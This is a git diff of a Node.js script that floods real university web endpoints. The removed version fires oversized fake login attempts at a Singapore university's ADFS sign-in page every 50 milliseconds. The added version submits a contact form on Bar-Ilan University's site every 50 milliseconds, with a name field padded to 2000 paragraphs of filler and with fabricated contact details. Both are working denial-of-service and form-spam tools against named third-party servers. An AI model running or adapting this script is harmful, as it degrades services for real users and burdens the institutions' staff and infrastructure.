@@ -1,7 +1,5 @@
 const axios = require('axios');
 const { LoremIpsum } = require('lorem-ipsum');
-const qs = require('qs');
-const fs = require('fs');
 
 const lorem = new LoremIpsum({
     sentencesPerParagraph: {
@@ -14,56 +12,27 @@ const lorem = new LoremIpsum({
     }
 });
 
-
-const filePath = 'example.txt';
-let counter = 0;
-
-// Function to write to the file
-const writeToFile = () => {
-    const dataToWrite = `This is line ${counter++}\n`;
-
-    fs.appendFile(filePath, dataToWrite, (err) => {
-        if (err) {
-            console.error('Error writing to the file:', err);
-        } else {
-            console.log(`Data has been written to the file: ${dataToWrite}`);
-        }
-    });
-};
-
+const qs = require('qs');
+let data = `full_name=${lorem.generateParagraphs(2000)}&phone_number=123131321&email=dghdhg%40gmail.com&referral_classification=intl.info%40biu.ac.il&request_subject=dghdfh&referral_content=dfhdfhdgf&form_build_id=form-qr9MMam0_kGyMiHxtbxnox3DIJ8IB3Dunx0u1mmAzbU&form_id=webform_submission_general_contact_form_node_402_add_form&_triggering_element_name=op&_triggering_element_value=Submit&_drupal_ajax=1&ajax_page_state%5Btheme%5D=biu_base&ajax_page_state%5Btheme_token%5D=&ajax_page_state%5Blibraries%5D=biu_base%2Fglobal%2Cbiu_base%2Fmain-menu%2Cbiu_base%2Fsite-header%2Cbiu_contact_form%2Fcandidate-contact-form%2Ccore%2Fdrupal.dialog.ajax%2Ccore%2Fhtml5shiv%2Ccore%2Fpicturefill%2Csystem%2Fbase%2Cwebform%2Fwebform.ajax%2Cwebform%2Fwebform.element.details.save%2Cwebform%2Fwebform.element.details.toggle%2Cwebform%2Fwebform.element.message%2Cwebform%2Fwebform.element.select%2Cwebform%2Fwebform.form`;
 
 let config = {
     method: 'post',
     maxBodyLength: Infinity,
-    url: 'https://loginfs.ntu.edu.sg/adfs/ls/?SAMLRequest=fZFLb4MwEIT%2FCvI9OJg0Dysg0eTQSGmLAu2hl8oYJ1gyNvXaffz7ktBHemjOOzsz%2B%2B0SWKs6mnnX6J148QJc8N4qDfQ0SJC3mhoGEqhmrQDqOC2y2y0l4Zh21jjDjUJBBiCsk0avjAbfClsI%2Byq5eNhtE9Q41wHFeC8rGWrnQ1H7EA64aGRVGSVcEwIYfLQlOL8vShSs%2Bx5Ss6Pj774yB6n3cG7B6j1gBRgFm3WCnjnh0WIWTydkNq84j%2BsqnjK2mAm%2BiKsxmfYyAC82GhzTLkFkTOJRFI0IKaMrGsV0Mn9CQf511rXUtdSHywyqQQT0pizz0dD%2BUVg4Ne8FKF0eSdJTsD1je9mWfQNF6X%2F44AffEp9FDHkdves9N%2BvcKMk%2Fgkwp87aygjmRoAjhdFj5%2B%2Fj0Ew%3D%3D&RelayState=ss%3Amem%3A2c821db57dd225b44126927f435904d1071daf0c2121fc1e0f3b94357f8f39a9&client-request-id=3f52e734-b80b-43dc-1402-0080012c0351',
+    url: 'https://www.biu.ac.il/en/node/402?ajax_form=1&_wrapper_format=html&_wrapper_format=drupal_ajax',
     headers: {
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'Cache-Control': 'max-age=0',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Cookie': '_gcl_au=1.1.794871248.1700666003; _ga=GA1.3.597401380.1700666003; _gid=GA1.3.659896837.1700666004; _gat_UA-176698766-1=1; _tt_enable_cookie=1; _ttp=h2_TC2oG6vw3nXWrSvotR-XuGpB; _ga_8LPDJ1LB78=GS1.1.1700666003.1.0.1700666015.48.0.0',
-        'Origin': 'https://loginfs.ntu.edu.sg',
-        'Referer': 'https://loginfs.ntu.edu.sg/adfs/ls/?SAMLRequest=fZFLb4MwEIT%2FCvI9OJg0Dysg0eTQSGmLAu2hl8oYJ1gyNvXaffz7ktBHemjOOzsz%2B%2B0SWKs6mnnX6J148QJc8N4qDfQ0SJC3mhoGEqhmrQDqOC2y2y0l4Zh21jjDjUJBBiCsk0avjAbfClsI%2Byq5eNhtE9Q41wHFeC8rGWrnQ1H7EA64aGRVGSVcEwIYfLQlOL8vShSs%2Bx5Ss6Pj774yB6n3cG7B6j1gBRgFm3WCnjnh0WIWTydkNq84j%2BsqnjK2mAm%2BiKsxmfYyAC82GhzTLkFkTOJRFI0IKaMrGsV0Mn9CQf511rXUtdSHywyqQQT0pizz0dD%2BUVg4Ne8FKF0eSdJTsD1je9mWfQNF6X%2F44AffEp9FDHkdves9N%2BvcKMk%2Fgkwp87aygjmRoAjhdFj5%2B%2Fj0Ew%3D%3D&RelayState=ss%3Amem%3A2c821db57dd225b44126927f435904d1071daf0c2121fc1e0f3b94357f8f39a9',
-        'Sec-Fetch-Dest': 'document',
+        'authority': 'www.biu.ac.il',
+        'accept': 'application/json, text/javascript, */*; q=0.01',
     },
-    data: qs.stringify({
-        'UserName': lorem.generateParagraphs(200),
-        'Password': 'qwkljqklwlejkl',
-        'AuthMethod': 'FormsAuthentication'
-    })
-
+    data: data
 };
-
 
 setInterval(() => {
     axios.request(config)
         .then((response) => {
             console.count(response.status);
-            writeToFile()
         })
         .catch((error) => {
-            console.count(error.response.data);
+            console.log(error);
         });
 
-}, 50);
+}, 50)   
